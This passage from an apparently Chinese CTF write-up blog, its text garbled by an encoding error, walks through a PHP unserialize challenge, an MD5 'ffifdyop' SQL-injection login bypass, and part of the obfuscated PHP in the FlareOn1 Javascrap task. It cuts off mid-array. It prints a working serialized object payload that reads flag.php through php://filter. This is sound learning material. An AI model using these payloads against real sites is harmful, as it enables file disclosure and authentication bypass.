&#123;<br>            if(strlen((string)$this-&gt;content) &gt; 100) &#123;<br>                $this-&gt;output(&quot;Too long!&quot;);<br>                die();<br>            &#125;<br>            $res = file_put_contents($this-&gt;filename, $this-&gt;content);<br>            if($res) $this-&gt;output(&quot;Successful!&quot;);<br>            else $this-&gt;output(&quot;Failed!&quot;);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Failed!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function read() &#123;<br>        $res = &quot;&quot;;<br>        if(isset($this-&gt;filename)) &#123;<br>            $res = file_get_contents($this-&gt;filename);<br>        &#125;<br>        return $res;<br>    &#125;<br><br>    private function output($s) &#123;<br>        echo &quot;[Result]: &lt;br&gt;&quot;;<br>        echo $s;<br>    &#125;<br><br>    function __destruct() &#123;<br>        if($this-&gt;op === &quot;2&quot;)<br>            $this-&gt;op = &quot;1&quot;;<br>        $this-&gt;content = &quot;&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>&#125;<br><br>function is_valid($s) &#123;<br>    for($i = 0; $i &lt; strlen($s); $i++)<br>        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))<br>            return false;<br>    return true;<br>&#125;<br><br>if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;<br><br>    $str = (string)$_GET[&#x27;str&#x27;];<br>    if(is_valid($str)) &#123;<br>        $obj = unserialize($str);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="åˆ†æä»£ç "><a href="#åˆ†æä»£ç " class="headerlink" title="åˆ†æä»£ç "></a>åˆ†æä»£ç </h3><p>ä¸€çœ¼çœ‹åˆ°<code>unserialize</code>ï¼ˆå¤§ä½“å°±æ˜¯è€ƒæŸ¥ååºåˆ—åŒ–äº†ï¼‰ï¼Œç„¶åæœ‰ä¸€ä¸ªåˆ¤æ–­ã€‚<code>is_valid($str)</code>,ä¸Šç½‘æ‰¾äº†åŠå¤©ï¼Œç»“æœè¿™æ˜¯ä¸€ä¸ªè‡ªå»ºå‡½æ•°ã€‚emmmâ€¦æ— è¯­å•¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">#å…¶åŠŸèƒ½å°±æ˜¯é™åˆ¶è¾“å…¥çš„å­—ç¬¦é•¿åº¦ä¸º32-125ï¼ˆè½¬åŒ–ä¸ºasciiåï¼‰</span><br></code></pre></td></tr></table></figure><p>ç„¶åæƒ³åˆ°é­”æ³•å‡½æ•°çš„è°ƒç”¨ã€‚è¿™é‡Œç›´æ¥å¼•ç”¨h3å¸ˆå‚…çš„æ–‡ç« ã€‚copyè¿‡æ¥ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">__destruct()ï¼š<span class="hljs-regexp">//</span>ææ„å‡½æ•°å½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨<br>__wakeup(): <span class="hljs-regexp">//u</span>nserialize()æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨<br>__invoke(): <span class="hljs-regexp">//</span>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹æ³•è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨<br>__call(): <span class="hljs-regexp">//</span>åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__callStatci(): <span class="hljs-regexp">//</span>åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__get(): <span class="hljs-regexp">//</span>ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®<br>__set(): <span class="hljs-regexp">//</span>ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§<br>__isset(): <span class="hljs-regexp">//</span>åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘<br>__unset(): <span class="hljs-regexp">//</span>åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘<br>__toString(): <span class="hljs-regexp">//</span>æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘<br>__construct(): <span class="hljs-regexp">//</span>æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡newçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œä½†åœ¨unserialize()æ—¶ä¸ä¼šè‡ªåŠ¨è°ƒç”¨<br>__sleep(): <span class="hljs-regexp">//</span>serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep() å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šè¢«ä¼˜å…ˆè°ƒç”¨<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±å¯ä»¥ç›´æ¥çœ‹çœ‹<code>_destruct()</code>å¹²äº†ä»€ä¹ˆã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><span class="hljs-comment">#opåˆå§‹å€¼ä¸º1</span><br></code></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿ<code>process()</code>å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>         <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶éœ€è¦è¿›å…¥<code>read()</code>å‡½æ•°ã€‚è¿™é‡Œ<code>output</code>ï¼Œä¼šå°†è¿”å›ç»“æœè¾“å‡ºã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶è¿™é‡Œå°±å¯ä»¥ç”¨php:&#x2F;&#x2F;filterä¼ªåè®®è¯»å–æ–‡ä»¶ã€‚</p><h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><p>1ã€éœ€è¦åœ¨è¿›å…¥<code>process</code>ä¹‹å‰å°†opçš„å€¼æ”¹ä¸º2ã€‚</p><p>2ã€æ„é€ filenaem&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223160637.png" alt="QQæˆªå›¾20220223160637"></p><p>è¿™é‡Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ã€‚æœäº†ä¸€ä¸‹wpã€‚çœ‹wpçš„æ—¶å€™å‘ç°è‡ªå·±çš„ä¼ªåè®®å†™é”™äº†ã€‚emmmâ€¦æ‰‹åŠ¨æ·»åŠ <code>//</code>ï¼Œå¹¶ä¸”æ‰‹åŠ¨æ”¹å˜wpã€‚<code>55</code>â€“<code>57</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223160814.png" alt="QQæˆªå›¾20220223160814"></p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="Base64è§£ç "><a href="#Base64è§£ç " class="headerlink" title="Base64è§£ç "></a>Base64è§£ç </h3><p>ç»“æŸã€‚</p><h2 id="SWPUCTF-2016-Web7"><a href="#SWPUCTF-2016-Web7" class="headerlink" title="[SWPUCTF 2016]Web7"></a>[SWPUCTF 2016]Web7</h2><p>è¿™é¢˜ç›¸å¯¹æ¥è¯´å°±æ¯”è¾ƒç®€å•ã€‚ç®€å•è®°å½•ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183715.png" alt="QQæˆªå›¾20220218183715"></p><p>å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿç™¾åº¦ä¸€ç§ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183842.png" alt="QQæˆªå›¾20220218183842"></p><p><strong>å¸ˆå‚…å·²ç»è®²å¾—å¾ˆè¯¦ç»†äº†ï¼Œæ€»è€Œè¨€ä¹‹å°±æ˜¯å½“æ³¨å…¥çš„pass&#x3D;ffifdyopæ—¶ï¼Œffifdyopç»è¿‡md5åŠ å¯†åå˜æˆ â€˜orâ€™6\xc9]\x99\xe9!r,\xf9\xedb\x1c è¢«è¿”å›ï¼Œ â€˜ \ â€˜åé¢çš„3ä¸ªå­—ç¬¦è¿åŒâ€™ \ â€˜ç®—ä¸€ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚â€™  \xc9 â€˜ï¼Œæ‰€ä»¥ä¸Šè¿°ä¸€å…±16ä¸ªå­—ç¬¦ã€‚å‡½æ•°md5($pass,true)è¿”å›ä¸ºtrueã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218184141.png" alt="QQæˆªå›¾20220218184141"></p><p>æŸ¥çœ‹æºç  MD5ç®€å•ç»•è¿‡ï¼Œç„¶åä¾æ—§MD5ç®€å•ç»•è¿‡ã€‚<br>ç»“æŸã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218184328.png" alt="QQæˆªå›¾20220218184328"></p><h2 id="FlareOn1-Javascrap"><a href="#FlareOn1-Javascrap" class="headerlink" title="[FlareOn1]Javascrap"></a>[FlareOn1]Javascrap</h2><p>ç»™äº†å‹ç¼©åŒ…ç›´æ¥ä¸‹è½½ä¸€ä¸‹ã€‚winhexæŸ¥çœ‹å›¾ç‰‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$terms</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>);<br><span class="hljs-variable">$order</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">13</span>, <span class="hljs-number">35</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">81</span>, <span class="hljs-number">76</span>, <span class="hljs-number">10</span>, <span class="hljs-number">28</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">11</span>, <span class="hljs-number">76</span>, <span class="hljs-number">68</span>, <span class="hljs-number">50</span>, <span class="hljs-number">30</span>, <span class="hljs-number">11</span>, <span class="hljs-number">24</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">45</span>, <span class="hljs-number">20</span>, <span class="hljs-number">23</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">63</span>, <span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">17</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">45</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">11</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">23</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">50</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">49</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">58</span>, <span class="hljs-number">66</span>, <span class="hljs-number">3</span>, <span class="hljs-number">86</span>, <span class="hljs-number">27</span>, <span class="hljs-number">88</span>, <span class="hljs-number">77</span>, <span class="hljs-number">80</span>, <span class="hljs-number">38</span>, <span class="hljs-number">25</span>, <span class="hljs-number">40</span>, <span class="hljs-number">81</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">76</span>, <span class="hljs-number">81</span>, <span class="hljs-number">15</span>, <span class="hljs-number">50</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">24</span>, <span class="hljs-number">81</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">28</span>, <span class="hljs-number">7</span>, <span class="hljs-number">88</span>, <span class="hljs-number">32</span>, <span class="hljs-number">45</span>, <span class="hljs-number">7</span>, <span class="hljs-number">90</span>, <span class="hljs-number">52</span>, <span class="hljs-number">80</span>, <span class="hljs-number">58</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">66</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">50</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">72</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">11</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span 